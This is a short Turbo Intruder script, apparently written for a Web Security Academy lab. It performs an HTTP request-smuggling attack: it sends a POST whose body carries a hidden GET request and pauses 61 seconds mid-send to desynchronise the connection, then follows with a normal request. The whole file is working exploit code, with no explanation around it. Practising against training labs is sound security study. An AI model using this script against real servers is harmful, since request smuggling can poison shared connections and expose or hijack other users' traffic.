def queueRequests(target, _):
    engine = RequestEngine(endpoint="https://0ae60053033c194a8028fd1a005a0024.web-security-academy.net:443",
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # attack request
    attack_request = """POST /resources HTTP/1.1
Host: 0ae60053033c194a8028fd1a005a0024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    # smuggled request GET
    smuggled_request = """GET /uripathdoesnotexist/ HTTP/1.1
Host: 0ae60053033c194a8028fd1a005a0024.web-security-academy.net

"""

    # normal request
    normal_request = """GET / HTTP/1.1
Host: 0ae60053033c194a8028fd1a005a0024.web-security-academy.net

"""
    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)


def handleResponse(req, _):
    table.add(req)